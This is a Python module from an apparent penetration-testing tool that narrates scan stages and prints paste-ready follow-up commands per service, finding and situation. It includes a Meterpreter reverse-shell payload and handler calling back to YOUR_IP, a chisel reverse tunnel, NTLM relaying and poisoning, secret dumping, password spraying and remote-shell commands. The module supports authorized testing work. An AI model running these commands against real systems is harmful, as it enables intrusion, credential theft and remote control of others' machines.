"""What each stage is doing, and what to run by hand afterwards.

Two things live here.

**Narration.** A scan that prints `[7/20] snmp-enumeration` tells an operator
almost nothing. `WHAT_IT_DOES` explains, in one line, what the stage is about to
try and why that matters — so the person watching learns the methodology rather
than just waiting for a spinner.

**Follow-up.** Vision automates the parts of an assessment that should be
automated: sweeping, enumerating, correlating. It cannot replace the part where
an analyst sits down with a shell and pokes at something, and pretending
otherwise would be dishonest — an automated tool that says "assessment complete"
is telling you the easy half is done.

So instead of hiding that boundary, this module marks it. Every service and
finding carries the commands a competent analyst would run next by hand, ready
to paste. Vision becomes the console that tells you where to dig, which is the
useful version of "one tool for manual testing".

Commands here are *suggestions printed as text*. Vision never runs them. Several
are intrusive by design — that judgement belongs to the operator, who knows the
engagement terms.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Iterable

# stage name -> what it is actually doing, in one plain-language line
WHAT_IT_DOES = {
    "host-discovery":
        "sweeping the scope for live hosts using ICMP and TCP probes",
    "port-scan":
        "identifying open TCP ports and fingerprinting the service on each",
    "udp-scan":
        "probing the UDP ports that carry findings — SNMP, IKE, NetBIOS, TFTP",
    "icmp-sweep":
        "a second ICMP sweep with fping — different hosts answer different "
        "probes, and a host missed here is invisible to every later stage",
    "arp-discovery":
        "layer-2 ARP sweep, which finds hosts that drop ICMP and every TCP "
        "probe: firewalled workstations, printers, appliances",
    "masscan-sweep":
        "fast SYN sweep of all 65535 ports to seed the version scan",
    "netbios-scan":
        "reading NetBIOS names to identify domain controllers and file servers",
    "smb-deep-enum":
        "full SMB enumeration — password policy, lockout threshold, groups, "
        "OS build",
    "smb-file-listing":
        "listing what is actually inside the anonymously readable shares",
    "kerberos-userenum":
        "enumerating valid accounts via Kerberos pre-auth — no password is "
        "sent, so nothing can lock out",
    "tls-structured":
        "structured TLS analysis: renegotiation, compression, certificate chain",
    "auth-admin-sprawl":
        "checking which hosts the supplied account is local administrator on — "
        "usually the most surprising finding on an internal network",
    "auth-share-access":
        "listing what an ordinary logged-in user can actually read and write, "
        "which is far more than what is open anonymously",
    "auth-password-policy":
        "reading the real password and lockout policy, only visible once "
        "authenticated",
    "auth-kerberoast":
        "requesting service tickets for accounts with an SPN — a normal "
        "Kerberos operation whose result is crackable offline",
    "banner-analysis":
        "applying rules to the collected banners: cleartext protocols, exposed "
        "admin services, outdated versions",
    "smb-enumeration":
        "checking whether SMB signing is enforced — unsigned SMB is what makes "
        "relay attacks possible",
    "smb-shares":
        "listing shares reachable without credentials, and whether any are "
        "writable",
    "rpc-enumeration":
        "asking each host for its user list over a null RPC session",
    "snmp-enumeration":
        "trying default community strings — a hit exposes the full device "
        "configuration",
    "nfs-exports":
        "listing NFS exports and who is allowed to mount them",
    "ldap-anonymous-bind":
        "testing whether the directory answers unauthenticated queries",
    "ike-vpn":
        "checking VPN endpoints for aggressive mode, which leaks a crackable "
        "hash",
    "datastore-exposure":
        "sending a read-only protocol probe to Redis, Memcached, MongoDB and "
        "Elasticsearch to see if they answer without credentials",
    "web-assessment":
        "inspecting HTTP responses for missing security headers, version "
        "disclosure, directory listing and dangerous methods",
    "web-exposed-paths":
        "requesting a short list of high-signal paths: .git, .env, actuator, "
        "server-status",
    "tls-certificate":
        "reading each certificate for expiry, self-signing and deprecated "
        "protocol negotiation",
    "tls-posture":
        "enumerating which TLS protocol versions each listener still accepts",
    "exploitdb-correlation":
        "matching detected product versions against Exploit-DB",
    "nuclei":
        "running templated CVE and misconfiguration checks against every "
        "discovered service",
    "tls-deep":
        "deep TLS analysis — Heartbleed, ROBOT, weak DH, certificate chain",
    "nmap-vuln-scripts":
        "running nmap's vulnerability script category against each service",
}


@dataclass(frozen=True)
class Step:
    """One hands-on command, with why it is worth running."""
    label: str
    command: str
    why: str
    intrusive: bool = False


# (matcher, ports, steps) — matched on nmap's service name first, port second,
# the same rule the enrichment stages use so a service on a non-standard port
# still gets its playbook.
SERVICE_PLAYBOOK: list[tuple[tuple[str, ...], tuple[int, ...], tuple[Step, ...]]] = [
    (("ftp",), (21, 2121), (
        Step("Anonymous login",
             "ftp {ip} {port}    # user: anonymous, pass: anything",
             "Anonymous FTP is common and often holds config or backups."),
        Step("List everything readable",
             "wget -r --no-passive ftp://anonymous:x@{ip}:{port}/ -P ./ftp-{ip}",
             "Pulls the tree so you can grep it offline instead of clicking around."),
        Step("Check for write access",
             "curl -T /tmp/test.txt ftp://{ip}:{port}/ --user anonymous:x",
             "A writable FTP root next to a web root is a straight path to RCE.",
             intrusive=True),
    )),
    (("ssh",), (22,), (
        Step("Confirm version and algorithms",
             "nmap -p{port} --script ssh2-enum-algos,ssh-hostkey {ip}",
             "Weak KEX or MAC sets are reportable on their own."),
        Step("Which auth methods are offered",
             "ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no {ip} -p {port}",
             "Tells you whether password auth is available before you spray anything."),
        Step("Enumerate users (pre-auth, no lockout)",
             "# nmap -p{port} --script ssh-auth-methods --script-args=\"ssh.user=root\" {ip}",
             "Confirms account existence without incrementing a lockout counter."),
    )),
    (("telnet",), (23, 2323), (
        Step("Grab the banner and login prompt",
             "nc -nv {ip} {port}",
             "The banner usually identifies the device model and firmware."),
        Step("Try vendor defaults",
             "# hydra -C /usr/share/wordlists/defaults.txt telnet://{ip}:{port}",
             "Telnet on an appliance almost always means default credentials.",
             intrusive=True),
    )),
    (("smtp",), (25, 587, 2525), (
        Step("User enumeration via VRFY/EXPN",
             "smtp-user-enum -M VRFY -U users.txt -t {ip} -p {port}",
             "Confirms valid mailboxes, which feed phishing and spraying."),
        Step("Open relay test",
             "nmap -p{port} --script smtp-open-relay {ip}",
             "An open relay is a high-severity finding in its own right."),
    )),
    (("http", "http-alt", "https"), (80, 443, 8080, 8443, 8000, 8888), (
        Step("Fingerprint the stack",
             "whatweb -a3 http://{ip}:{port}",
             "Identifies CMS, framework and version — drives everything after."),
        Step("Enumerate content",
             "feroxbuster -u http://{ip}:{port} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak",
             "Directory discovery is still the highest-yield web step.",
             intrusive=True),
        Step("Nikto pass",
             "nikto -h http://{ip}:{port}",
             "Catches old CGI, dangerous methods and server misconfiguration."),
        Step("Proxy it for manual work",
             "# set browser proxy to 127.0.0.1:8080, then browse http://{ip}:{port}",
             "Burp or ZAP is where the actual manual testing happens."),
    )),
    (("microsoft-ds", "netbios-ssn", "smb"), (139, 445), (
        Step("Full enumeration",
             "enum4linux-ng -A {ip}",
             "Users, groups, shares, password policy and OS in one pass."),
        Step("Share contents as guest",
             "smbclient -N -L //{ip}/ && smbclient -N //{ip}/SHARE",
             "Listing shares is not the same as reading them — check both."),
        Step("Spider readable shares",
             "nxc smb {ip} -u '' -p '' -M spider_plus",
             "Finds credentials in scripts and config files inside shares."),
        Step("Password policy before any spraying",
             "nxc smb {ip} -u '' -p '' --pass-pol",
             "Read the lockout threshold before you touch authentication."),
    )),
    (("ldap",), (389, 636, 3268), (
        Step("Dump the directory anonymously",
             "ldapsearch -x -H ldap://{ip}:{port} -b \"$(ldapsearch -x -H ldap://{ip}:{port} -s base namingContexts | awk '/^namingContexts/{{print $2; exit}}')\"",
             "Anonymous bind often exposes the whole user tree."),
        Step("Collect for BloodHound",
             "bloodhound-python -d DOMAIN -u USER -p PASS -ns {ip} -c All",
             "Turns the directory into an attack graph once you have any account."),
    )),
    (("mysql",), (3306,), (
        Step("Try a blank root password",
             "mysql -h {ip} -P {port} -u root",
             "Still works far more often than it should."),
        Step("Enumerate without credentials",
             "nmap -p{port} --script mysql-info,mysql-empty-password,mysql-users {ip}",
             "Confirms version and whether any account has no password."),
    )),
    (("ms-sql-s", "mssql"), (1433,), (
        Step("Fingerprint the instance",
             "nmap -p{port} --script ms-sql-info,ms-sql-empty-password {ip}",
             "Version and blank-sa check in one step."),
        Step("Connect once you have credentials",
             "impacket-mssqlclient USER:PASS@{ip} -windows-auth",
             "xp_cmdshell is often reachable from a low-privilege SQL account."),
    )),
    (("postgresql", "postgres"), (5432,), (
        Step("Try default credentials",
             "psql -h {ip} -p {port} -U postgres",
             "postgres/postgres and trust auth are both common."),
    )),
    (("redis",), (6379, 6380), (
        Step("Confirm unauthenticated access",
             "redis-cli -h {ip} -p {port} INFO",
             "If INFO answers, the keyspace is readable by anyone."),
        Step("Read the keyspace",
             "redis-cli -h {ip} -p {port} --scan | head -50",
             "Session tokens and cached credentials turn up here constantly."),
        Step("Check whether CONFIG is reachable",
             "redis-cli -h {ip} -p {port} CONFIG GET dir",
             "CONFIG SET is the step that turns read access into file write.",
             intrusive=True),
    )),
    (("vnc",), (5900, 5901), (
        Step("Check the auth requirement",
             "nmap -p{port} --script vnc-info,realvnc-auth-bypass {ip}",
             "Some builds accept a null authentication type outright."),
        Step("Connect",
             "vncviewer {ip}:{port}",
             "If it opens without a prompt, that is an interactive session."),
    )),
    (("ms-wbt-server", "rdp"), (3389,), (
        Step("Check NLA and certificate",
             "nmap -p{port} --script rdp-ntlm-info,rdp-enum-encryption {ip}",
             "NLA disabled means pre-auth exposure; the NTLM info leaks the domain."),
    )),
    (("snmp",), (161,), (
        Step("Walk the full tree",
             "snmpwalk -v2c -c public {ip}",
             "The running config often contains credentials in cleartext."),
        Step("Extract the interesting branches",
             "snmp-check {ip} -c public",
             "Formats users, processes, software and network config readably."),
    )),
    (("nfs", "rpcbind"), (111, 2049), (
        Step("Mount and inspect",
             "showmount -e {ip} && mkdir -p /mnt/nfs && mount -t nfs {ip}:/EXPORT /mnt/nfs -o nolock",
             "Home directories on an export usually mean SSH private keys."),
        Step("Check for no_root_squash",
             "# create a setuid binary inside the mount as root",
             "no_root_squash turns a readable export into local privilege escalation.",
             intrusive=True),
    )),
    (("mongodb", "mongod"), (27017, 27018), (
        Step("Connect without credentials",
             "mongosh --host {ip} --port {port} --eval 'db.adminCommand({{listDatabases:1}})'",
             "Unauthenticated MongoDB exposes every database at once."),
    )),
    (("elasticsearch",), (9200, 9300), (
        Step("List indices",
             "curl -s http://{ip}:{port}/_cat/indices?v",
             "Index names alone often reveal what the data is."),
    )),
    (("memcached",), (11211,), (
        Step("Dump statistics and keys",
             "memcstat --servers={ip}:{port} && nc -nv {ip} {port} <<< 'stats items'",
             "Cached session data is frequently readable in full."),
    )),
]


# finding title pattern -> extra follow-up beyond the service-level steps
FINDING_PLAYBOOK: list[tuple[str, tuple[Step, ...]]] = [
    (r"SMB signing", (
        Step("Set up a relay",
             "impacket-ntlmrelayx -tf targets.txt -smb2support",
             "Demonstrates the actual impact rather than reporting a checkbox.",
             intrusive=True),
        Step("Find hosts to relay to",
             "nxc smb {scope} --gen-relay-list relay-targets.txt",
             "Builds the target list of every host with signing disabled."),
    )),
    (r"shares accessible without auth", (
        Step("Search shares for credentials",
             "nxc smb {ip} -u '' -p '' -M spider_plus --share SHARE",
             "web.config, unattend.xml and .ps1 scripts are the usual hits."),
    )),
    (r"users enumerable|anonymous bind", (
        Step("Check for AS-REP roastable accounts",
             "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip {ip}",
             "Accounts without pre-auth yield a crackable hash with no credentials."),
        Step("Spray only after reading the policy",
             "nxc smb {ip} -u users.txt -p 'Season2026!' --continue-on-success",
             "One password per lockout window, never a wordlist per account.",
             intrusive=True),
    )),
    (r"Environment file exposed|Git repository exposed", (
        Step("Retrieve and read it",
             "curl -s http://{ip}:{port}/.env",
             "The database credentials are usually right there."),
        Step("Reconstruct the repository",
             "git-dumper http://{ip}:{port}/.git/ ./dump-{ip}",
             "Full source history, often including committed secrets."),
    )),
    (r"MS17-010|CVE-2017-014", (
        Step("Verify without exploiting",
             "nmap -p445 --script smb-vuln-ms17-010 {ip}",
             "Independent confirmation before you put it in the report."),
    )),
    (r"Deprecated protocol|certificate", (
        Step("Full TLS audit",
             "testssl.sh --full {ip}:{port}",
             "Gives the cipher-by-cipher detail a client will ask for."),
    )),
    (r"Public exploits available", (
        Step("Read the exploit before running it",
             "searchsploit -m EDB-ID && less *.py",
             "Public exploits regularly contain destructive or fake payloads."),
    )),
]


# Situations rather than services. These tools need a foothold, credentials, or
# a human deciding what to pivot where — wrapping them in an automated stage
# would produce a stage that always skips, which looks like coverage and
# delivers none. They are reachable here, where the operator gets the exact
# command and decides whether the engagement permits it.
SITUATION_PLAYBOOK: list[tuple[str, str, tuple[Step, ...]]] = [
    ("faster-sweeps", "The scan is too slow for this scope", (
        Step("Sweep with masscan, then version-scan the hits",
             "masscan -iL hosts.txt -p1-65535 --rate 10000 -oL open.txt",
             "Minutes instead of hours on a /16; nmap then does version "
             "detection on just the open ports."),
        Step("rustscan into nmap",
             "rustscan -a {ip} --ulimit 5000 -- -sV -sC",
             "Same idea for a single host, with nmap handed the results."),
        Step("naabu for a host list",
             "naabu -list hosts.txt -top-ports 1000 -o naabu.txt",
             "Fast, and its output feeds straight into nuclei."),
        Step("Passive discovery on an unfamiliar segment",
             "netdiscover -i eth0 -p",
             "Listens for ARP without sending any, so it finds hosts without "
             "announcing you. Slow, and only useful on the local segment."),
    )),
    ("dns-surface", "The scope includes domains, not just addresses", (
        Step("Passive subdomain enumeration",
             "subfinder -d example.com -all -o subs.txt",
             "No traffic to the target; safe before an engagement window opens."),
        Step("Resolve and probe what came back",
             "dnsx -l subs.txt -a -resp -o resolved.txt",
             "Turns names into addresses you can check against your scope."),
        Step("Deeper attack-surface mapping",
             "amass enum -passive -d example.com -o amass.txt",
             "Slower and broader; useful when the scope is 'whatever they own'."),
    )),
    ("ad-enumeration", "You have a domain and any set of credentials", (
        Step("LDAP enumeration with credentials",
             "windapsearch -d DOMAIN --dc-ip {ip} -u USER -p PASS -U",
             "Users, groups and computers straight from the directory."),
        Step("Build the BloodHound graph",
             "bloodhound-python -d DOMAIN -u USER -p PASS -ns {ip} -c All",
             "Shows the shortest path to Domain Admin rather than a flat list."),
        Step("Kerberoast service accounts",
             "impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip {ip} -request",
             "Service account hashes, crackable offline with no lockout risk."),
        Step("Dump secrets once you have admin",
             "impacket-secretsdump DOMAIN/USER:PASS@{ip}",
             "Local hashes and, on a DC, the whole domain.",
             intrusive=True),
    )),
    ("credential-capture", "You are on the internal network with a foothold", (
        Step("Poison name resolution and capture hashes",
             "# responder -I eth0 -wd",
             "Captures NetNTLMv2 from mistyped hostnames. Very noisy and it "
             "answers for hosts that are not yours — get this in writing first.",
             intrusive=True),
        Step("Relay instead of cracking, where signing is off",
             "# impacket-ntlmrelayx -tf relay-targets.txt -smb2support",
             "Turns a captured authentication into access without ever "
             "knowing the password.",
             intrusive=True),
    )),
    ("online-guessing", "You have a user list and permission to test passwords", (
        Step("Read the lockout policy first",
             "nxc smb {ip} -u '' -p '' --pass-pol",
             "One password per lockout window is survivable; a wordlist per "
             "account locks out the estate and ends the engagement."),
        Step("Single password across many accounts",
             "# hydra -L users.txt -p 'Season2026!' smb://{ip} -t 1",
             "Spraying, not brute force. One attempt per account per window.",
             intrusive=True),
        Step("Alternative sprayers",
             "# medusa -H hosts.txt -U users.txt -p 'Season2026!' -M smbnt\n"
             "      # ncrack -U users.txt -P one-password.txt {ip}:3389",
             "Same discipline applies: these lock accounts out just as fast.",
             intrusive=True),
    )),
    ("offline-cracking", "You captured hashes", (
        Step("Identify the hash type first",
             "hashid hashes.txt",
             "Running the wrong mode wastes hours of GPU time."),
        Step("Crack with hashcat",
             "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule",
             "Offline: no traffic to the client, no lockout risk."),
        Step("Or John, for odd formats",
             "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
             "Handles formats hashcat does not."),
    )),
    ("using-access", "You have valid credentials for a host", (
        Step("Interactive shell over WinRM",
             "evil-winrm -i {ip} -u USER -p PASS",
             "Cleanest interactive access to Windows when 5985 is open."),
        Step("SMB execution",
             "impacket-psexec DOMAIN/USER:PASS@{ip}",
             "SYSTEM shell where the account is a local admin.",
             intrusive=True),
        Step("MSSQL, and command execution through it",
             "impacket-mssqlclient DOMAIN/USER:PASS@{ip} -windows-auth",
             "xp_cmdshell is often reachable from a low-privilege SQL login."),
        Step("Validate credentials estate-wide before using them",
             "nxc smb targets.txt -u USER -p PASS",
             "Shows every host the account opens — usually more than expected."),
    )),
    ("pivoting", "You need to reach a segment you cannot route to", (
        Step("SOCKS proxy over an existing SSH session",
             "sshuttle -r USER@{ip} 10.0.0.0/8 --dns",
             "Simplest option when you already have SSH; behaves like a VPN."),
        Step("Tunnel through HTTP with chisel",
             "chisel server -p 8000 --reverse   # then on the target:\n"
             "      chisel client YOUR_IP:8000 R:socks",
             "Works where only outbound HTTP is allowed."),
        Step("Full TUN interface with ligolo-ng",
             "ligolo-proxy -selfcert   # agent on the target dials back",
             "Gives a real interface, so tools work without proxy wrappers."),
        Step("Push existing tools through the tunnel",
             "proxychains4 nmap -sT -Pn -n {ip}",
             "TCP connect scans only — proxychains cannot carry raw packets."),
        Step("Simple port relay",
             "socat TCP-LISTEN:9000,fork TCP:{ip}:445",
             "When you need one port forwarded and nothing more."),
    )),
    ("traffic-analysis", "You want to see what is actually on the wire", (
        Step("Capture for later analysis",
             "tcpdump -i eth0 -w capture.pcap -s0 'not port 22'",
             "Excludes your own session so the capture stays readable."),
        Step("Extract credentials from a capture",
             "tshark -r capture.pcap -Y 'http.authorization || ftp.request.command == \"PASS\"'",
             "Cleartext protocols give up credentials directly."),
        Step("Live interception",
             "# bettercap -iface eth0 -eval 'net.probe on'",
             "ARP spoofing is disruptive and affects hosts beyond your target.",
             intrusive=True),
        Step("Probe firewall behaviour",
             "hping3 -S -p 445 -c 3 {ip}",
             "Distinguishes filtered from closed when nmap is ambiguous."),
        Step("Craft something specific",
             "python3 -c \"from scapy.all import *; sr1(IP(dst='{ip}')/TCP(dport=445,flags='S'))\"",
             "For protocol edge cases no scanner covers."),
    )),
    ("external-scanners", "The engagement requires an authenticated scan", (
        Step("Greenbone / OpenVAS",
             "gvm-cli --gmp-username admin socket --xml '<get_tasks/>'",
             "Needs a running Greenbone server; Vision does not manage one."),
        Step("Nessus",
             "/opt/nessus/sbin/nessuscli scan list",
             "Commercial and licensed; Vision only reads results you export."),
    )),
    ("manual-tls", "You want to inspect a certificate by hand", (
        Step("Read the presented chain",
             "openssl s_client -connect {ip}:{port} -showcerts </dev/null",
             "Shows exactly what the server sends, including intermediates."),
        Step("Check a specific protocol version",
             "openssl s_client -connect {ip}:{port} -tls1_1 </dev/null",
             "Definitive answer when a scanner reports ambiguously."),
    )),
    ("payloads", "You have a confirmed path and need a payload", (
        Step("Generate one",
             "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe -o p.exe",
             "Port 443 outbound is the most likely to survive egress filtering.",
             intrusive=True),
        Step("Catch it",
             "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP; set LPORT 443; run'",
             "Have the handler listening before you execute anything."),
    )),
]


def situations() -> list[tuple[str, str, tuple[Step, ...]]]:
    return SITUATION_PLAYBOOK


def for_situation(key: str) -> list[Step]:
    for k, _title, steps in SITUATION_PLAYBOOK:
        if k == key:
            return list(steps)
    return []


def _matches(svc: dict, names: tuple[str, ...], ports: tuple[int, ...]) -> bool:
    blob = " ".join(filter(None, [svc.get("name"), svc.get("product")])).lower()
    if blob:
        return any(n in blob for n in names)
    return svc.get("port") in ports


def for_service(svc: dict) -> list[Step]:
    for names, ports, steps in SERVICE_PLAYBOOK:
        if _matches(svc, names, ports):
            return list(steps)
    return []


def for_finding(finding: dict) -> list[Step]:
    title = finding.get("title") or ""
    out: list[Step] = []
    for pattern, steps in FINDING_PLAYBOOK:
        if re.search(pattern, title, re.I):
            out.extend(steps)
    return out


def render(steps: Iterable[Step], ip: str = "", port: int | None = None,
           scope: str = "") -> list[tuple[Step, str]]:
    """Fill placeholders, returning (step, ready-to-paste command)."""
    out = []
    for s in steps:
        try:
            cmd = s.command.format(ip=ip or "TARGET",
                                   port=port or "PORT",
                                   scope=scope or "SCOPE")
        except (KeyError, IndexError, ValueError):
            cmd = s.command
        out.append((s, cmd))
    return out


def describe(stage: str) -> str:
    return WHAT_IT_DOES.get(stage, "")
